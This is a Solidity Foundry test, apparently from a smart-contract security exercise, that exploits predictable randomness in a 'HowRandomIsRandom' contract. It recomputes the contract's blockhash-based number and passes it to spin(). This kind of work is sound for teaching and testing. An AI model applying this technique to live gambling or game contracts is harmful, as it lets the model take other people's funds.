pragma solidity >=0.6.0;

import "../lib/forge-std/src/Test.sol";
import "../src/HowRandomIsRandom.sol" ;

contract Attacker is Test {
    HowRandomIsRandom rand;

    function setUp() public {
        rand = new HowRandomIsRandom(); // Set a new instance for HowRandomIsRandom contract
        vm.deal(address(rand), 10 ether); 
    }

    function testAttacker() public {
        //Reproduce the function that  already exist in the spin method will result always zero, and then give to the method the result
        uint256 num = uint256(keccak256(abi.encodePacked(blockhash(block.number)))) % 100;
        rand.spin{value: 1 ether}(num);
        assertEq(address(rand).balance, 11 ether);
    }
}